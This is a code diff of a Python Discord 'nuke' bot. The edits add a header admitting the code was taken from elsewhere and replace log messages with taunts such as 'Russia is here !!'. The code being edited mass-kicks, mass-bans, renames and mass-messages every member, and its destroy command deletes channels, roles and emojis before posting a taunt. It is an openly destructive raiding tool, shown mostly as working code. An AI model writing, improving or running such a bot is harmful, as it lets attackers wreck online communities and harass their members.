@@ -1,9 +1,13 @@
+####################################################
+
+# This code is not mine 100% i got it somewhere "i forgot" but i did some changes on it :3
+
+###################################################
 import discord
 from discord.ext import commands
 from discord.ext.commands import Bot
 from config import BOT_TOKEN, prefix
 import asyncio
-import time
 import random
 intents = discord.Intents(messages=True, guilds=True, members=True)
 # Imports the needed libs.
@@ -15,7 +19,7 @@ client.remove_command("help")
 
 @client.event
 async def on_ready():
-    print ("Ah shit, here we go again")
+    print ("SpyroHB Was here ._.")
 
 @client.event
 async def on_server_join(server):
@@ -32,8 +36,8 @@ async def kall(ctx):
             await guild.kick(member)
             print (f"{member.name} has been kicked")
         except:
-            print (f"{member.name} has FAILED to be kicked")
-        print ("Action completed: Kick all")
+            print (f"{member.name} has failed to be kicked")
+        print ("Kicked all")
 #############################
 
 ####BALL COMMAND####
@@ -47,7 +51,7 @@ async def ball(ctx):
             print ("User " + member.name + " has been banned")
         except:
             pass
-    print ("Action completed: Ban all")
+    print ("Banned all")
 #############################
 
 ####RALL COMMAND####
@@ -59,8 +63,8 @@ async def rall(ctx, rename_to):
             await member.edit(nick=rename_to)
             print (f"{member.name} has been renamed to {rename_to}")
         except:
-            print (f"{member.name} has NOT been renamed")
-        print("Action completed: Rename all")
+            print (f"{member.name} failed to be renamed")
+        print("Renamed all")
 #############################
 
 ####MALL COMMAND####
@@ -81,7 +85,7 @@ async def mall(ctx):
                 await member.send(x)
         except:
             pass
-        print("Action completed: Message all")
+        print("sent Message to all")
 #############################
 
 ###DESTROY COMMAND####
@@ -95,8 +99,8 @@ async def destroy(ctx):
         except:
             pass
         guild = ctx.message.guild
-        channel = await guild.create_text_channel("Ez Clap")
-        await channel.send("GET NUKED")
+        channel = await guild.create_text_channel("AURA!!!")
+        await channel.send("Russia is here !!")
     for role in list(ctx.guild.roles):
         try:
             await role.delete()
@@ -115,7 +119,7 @@ async def destroy(ctx):
             print (f"{emoji.name} has been deleted")
         except:
             pass    
-    print("Action completed: Nuclear Destruction")
+    print("Nuked dem !!")
 #############################
 
 #############################
@@ -131,7 +135,7 @@ async def info(ctx, member: discord.Member=None):
     else:
         embed=discord.Embed(title=None, description="**The user's name is: {}**".format(member.name) + "\n**The user's ID is: {}**".format(member.id) + "\n**The user's current status is: {}**".format(member.status) + "\n**The user's highest role is: {}**".format(member.top_role) + "\n**The user joined at: {}**".format(member.joined_at))
         await channel.send(embed=embed)
-    print("Action completed: User Info")
+    print("Operation Done !")
 
 
 
